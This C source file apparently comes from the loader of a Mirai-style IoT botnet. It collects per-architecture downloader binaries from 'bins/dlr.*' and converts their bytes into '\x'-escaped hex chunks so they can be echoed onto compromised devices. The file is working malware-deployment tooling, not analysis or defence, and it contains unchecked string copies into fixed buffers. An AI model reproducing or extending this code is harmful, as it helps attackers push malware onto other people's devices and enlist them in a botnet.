#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <glob.h>
#include "headers/includes.h"
#include "headers/binary.h"

static int bin_list_len = 0;
static struct binary **bin_list = NULL;

BOOL binary_init(void)
{
    glob_t pglob;
    int i;

    if (glob("bins/dlr.*", GLOB_ERR, NULL, &pglob) != 0)
    {
        printf("[binary] Failed to load from bins folder!\n");
        return FALSE;
    }

    if (pglob.gl_pathc == 0) {
        printf("[binary] No binaries found in bins/\n");
        globfree(&pglob);
        return FALSE;
    }

    for (i = 0; i < pglob.gl_pathc; i++)
    {
        char file_name[256];
        struct binary *bin;

        bin_list = realloc(bin_list, (bin_list_len + 1) * sizeof(struct binary *));
        bin_list[bin_list_len] = calloc(1, sizeof(struct binary));
        bin = bin_list[bin_list_len++];

        strcpy(file_name, pglob.gl_pathv[i]);
        strtok(file_name, ".");
        char *arch = strtok(NULL, ".");
        if (arch != NULL) {
            strcpy(bin->arch, arch);
        } else {
            strcpy(bin->arch, "x86_64");
        }
        load(bin, pglob.gl_pathv[i]);
    }

    globfree(&pglob);
    return TRUE;
}

struct binary *binary_get_by_arch(char *arch)
{
    int i;

    for (i = 0; i < bin_list_len; i++)
    {
        if (strcmp(arch, bin_list[i]->arch) == 0)
            return bin_list[i];
    }
    return NULL;
}

static BOOL load(struct binary *bin, char *fname)
{
    FILE *file;
    char rdbuf[256];
    int n;

    if ((file = fopen(fname, "r")) == NULL)
    {
        printf("[binary] Failed to open %s for parsing\n", fname);
        return FALSE;
    }

    bin->hex_payloads = NULL;
    bin->hex_payloads_len = 0;

    while ((n = fread(rdbuf, 1, 256, file)) != 0)
    {
        char *ptr;
        int i;

        bin->hex_payloads = realloc(bin->hex_payloads, (bin->hex_payloads_len + 1) * sizeof(char *));
        bin->hex_payloads[bin->hex_payloads_len] = calloc(1, (4 * n) + 8);
        ptr = bin->hex_payloads[bin->hex_payloads_len++];

        for (i = 0; i < n; i++)
            ptr += sprintf(ptr, "\\x%02x", (unsigned char)rdbuf[i]);
    }

    fclose(file);
    return TRUE;
}